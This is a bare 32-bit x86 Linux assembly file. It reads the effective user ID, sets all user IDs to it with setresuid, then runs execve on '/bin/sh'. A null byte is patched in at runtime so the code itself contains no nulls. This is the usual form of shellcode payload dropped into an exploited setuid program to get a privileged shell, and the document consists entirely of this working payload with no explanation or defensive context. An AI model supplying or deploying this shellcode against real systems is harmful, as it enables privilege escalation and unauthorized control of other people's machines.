bits 32

	xor eax,eax
	mov al,49
	int 80h
	
	mov ebx,eax
	mov ecx,eax
	mov edx,eax
	xor eax,eax
	mov al,164
	int 80h

	; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);
  push 0x1168732f
	push 0x6e69622f
	mov ebx,esp
  xor edx, edx
  push edx
	push ebx

  mov ecx, esp
	mov [ebx + 7], dl

	xor eax,eax
	mov al, 11
	int 80h
